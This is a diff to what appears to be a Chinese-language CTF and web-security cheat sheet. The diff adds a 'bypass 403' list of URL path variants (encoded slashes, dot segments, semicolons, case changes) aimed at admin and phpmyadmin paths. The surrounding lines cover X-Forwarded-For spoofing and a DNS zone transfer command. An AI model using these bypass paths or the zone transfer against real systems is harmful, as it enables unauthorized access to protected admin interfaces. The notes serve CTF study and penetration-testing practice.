@@ -4143,6 +4143,8 @@ state[i] = state[i-3] + state[i-31]`
         - 同時送多個 `X-Forwarded-For` header，可以讓真實 IP 被包在 IP list 中間 (Spoofing)
         - Example: [angstromCTF 2021 - Spoofy](https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy)
 
+
+
 - DNS Zone Transfer
     - `dig @1.2.3.4 abc.com axfr`
         - DNS Server: `1.2.3.4`
@@ -4437,6 +4439,23 @@ state[i] = state[i-3] + state[i-31]`
     - https://github.com/WebAssembly/wabt
 
 ----
+
+bypass 403  
+d.org/admin/*
+d.org/*admin/
+d.org/%2fadmin/
+d.org%2fadmin%2f
+d.org/./admin/
+d.org//admin/./
+d.org///admin///
+d.org//admin//
+d.org/ADMIN/
+d.org/;/admin/
+d.org//;//admin/
+/phpmyadmin/*
+/./phpmyadmin/
+//phpmyadmin//
+/*/phpmyadmin/
 
 # 高级PHP应用程序漏洞审核技术 #
 
